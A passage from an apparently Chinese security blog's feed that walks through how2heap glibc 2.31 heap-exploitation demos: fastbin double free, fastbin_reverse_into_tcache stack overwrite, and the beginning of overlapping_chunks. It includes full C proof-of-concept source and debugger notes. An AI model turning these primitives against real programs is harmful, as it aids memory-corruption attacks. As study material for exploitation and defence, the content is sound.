class="comment">//P2的bk指针要等于P3的头指针</span></span><br><span class="line">P2-&gt;bk-&gt;fd = P3; <span class="comment">//P2的bk指针指向的堆块的fd指针要等于P3的头指针</span></span><br></pre></td></tr></table></figure><p>再转换</p><ul><li>p2-&gt;bk-&gt;fd = stack_var1</li><li>p2-&gt;bk-&gt;fd = p3</li></ul><p>解方程得 <code>stack_var1 = P3</code></p><p>综上  <code>stack_var1 = stack_var2 = P3</code></p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/112825556?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/112825556?spm=1001.2014.3001.5501</a></p><p>  ​        </p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之how2heap-2.31</title>
      <link href="/2021/12/09/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhow2heap-2-31/"/>
      <url>/2021/12/09/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhow2heap-2-31/</url>
      
        <content type="html"><![CDATA[<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>和 2.27 没啥区别，依旧要填满 tcachebin 才能 double free</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g fastbin_dup.c -o fastbin_dup</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">               <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free     list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a)    ;</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p tw    ice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>（之后行数为断点位置）</p><p>20 行，将 tcachebin 填满</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053203655958/866ce742c70ee90bc8dd8a8382f78ea677262d8d.png" alt="image-20211209203323430"></p><p>29 行，calloc 三个 chunk，地址后三位分别是 3a0、3c0、3e0，由于这里是使用 calloc 创建的，所以不会分配 tcache bin 中的堆块</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053243183624/4a9892c36f985356a684c06acff8e701ddbb6027.png" alt="image-20211209203402999"></p><p>41 行，将 3a0、3c0 free 掉，进入 fastbin，因为函数指针未置零，所以再 free 一次 3a0，double free</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053603368112/62f27c36df6539d2cae8bc08a5c24053ebd13d10.png" alt="image-20211209204003210"></p><p>49 行，再次 calloc 3 次</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053663477035/8a0db771d5dbb3e9990a34cdfc6f241a9716030f.png" alt="image-20211209204103332"></p><p>可以发现 3a0 被 calloc 了两次</p><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>36 行，填满 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055251302798/87b02cd6b966f806ffa2866e8348cf66d4b3d36b.png" alt="image-20211209210731124"></p><p>45 行，再次 free 一个相同大小的 chunk ，tcachebin 填满了，所以会进入 fastbin </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055413297547/da3923794b45e6b1df5a00a217a66d373c3a1b98.png" alt="image-20211209211013123"></p><p>58 行，把剩下的 chunk 全部放入 fastbin</p><p>（？：为啥要把其他 chunk 都放进 fastbin “接下来我们需要释放 1 到 6 个更多的指针。这些也会在 fastbin 中。如果我们要覆盖的堆栈地址不为零那么我们需要再释放 6 个指针，否则攻击将导致分段错误。但如果堆栈上的值为零，则一个空闲就足够了。” 不是很理解）</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055700167520/384960d656e7ddccdac6c4d05a2bdde8f1de7024.png" alt="image-20211209211459901"></p><p>62 行，初始化了一个数组，并用 0xcd 填满</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056212586176/ac2c135f2a6ea3cdd188d77a2560536466b14c53.png" alt="image-20211209212332412"></p><p>80 行，把数组起始地址赋给 目标 chunk (victim)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056351911524/7501c2cd5bf357d4b72d1b2115741181c0d365d0.png" alt="image-20211209212551751"></p><p>91 行，把 tcachebin 中的 chunk 都拿出来</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056642208263/8affc5e25b3cd4b0ce8fda8bafb5e7cffe540925.png" alt="image-20211209213042048"></p><p>120 行，这时又单独申请出了一个 chunk ，在这之前 fastbin 中的链表为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbins：chunk_1 --&gt; chunk_2 --&gt; chunk_3 --&gt; chunk_4 --&gt; chunk_5 --&gt; chunk_6 --&gt; chunk_7 --&gt; stack_var</span><br></pre></td></tr></table></figure><p>在单独申请一个 fastbin 中的堆块后，由于 tcache 的机制，剩余未被申请的堆块会以倒序的方式重新被挂进 tcache bin 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcachebins：stack_var --&gt; chunk_7 --&gt; chunk_6 --&gt; chunk_5 --&gt; chunk_4 --&gt; chunk_3 --&gt; chunk_2</span><br></pre></td></tr></table></figure><p>因此，原本是堆块的 stack_var，由于被写在了目标堆块的fd指针上，所以被当成一个堆块挂进 tcache bin 链表中：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639057230045104/8b6f7c20a142ababe590dae3d3595a0651ae5722.png" alt="image-20211209214029875"></p><p>可以看到 stack_var 中也被写入了相应的 fd 和 bk</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639057406988122/c936cef9f232c0d04cc1d59cb5472c3dcc4258bf.png" alt="image-20211209214326829"></p><p>131 行，这时再申请一个对应大小的 chunk，stack_var 就会被当作堆块分配出来，就可以在相应的栈地址进行操作了</p><h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nThis is another simple chunks overlapping problem\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The previous technique is killed by patch:          https://sourceware.org/git/p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;and the prev_size of it must match the unsortedbin&#x27;s size\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 4 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">        p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">        p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">        <span class="keyword">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">                 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">        *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">        <span class="comment">/* 